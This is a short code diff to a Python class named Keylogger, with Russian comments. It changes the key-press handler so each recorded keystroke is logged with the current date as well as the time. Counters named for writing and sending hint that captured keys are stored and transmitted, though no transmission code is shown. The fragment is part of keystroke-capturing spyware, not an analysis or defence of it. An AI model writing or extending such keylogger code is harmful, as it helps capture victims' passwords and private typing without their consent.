@@ -105,8 +105,9 @@ class Keylogger:
         # метод срабатывающий при нажатии клавиши
         def on_press(key):
             k: str = str(key).replace("'", "")
-            cur_time: str = datetime.datetime.now().time().isoformat()[:-7]
-            keys_logs.append(f'{cur_time}: {k}\n')
+            cur_date: str = datetime.date.today().isoformat()  # текущая дата
+            cur_time: str = datetime.datetime.now().time().isoformat()[:-7]  # текущее время
+            keys_logs.append(f'{cur_date}:{cur_time}:{k}\n')
 
             self.press_to_write_count += 1
             self.press_to_send_count += 1
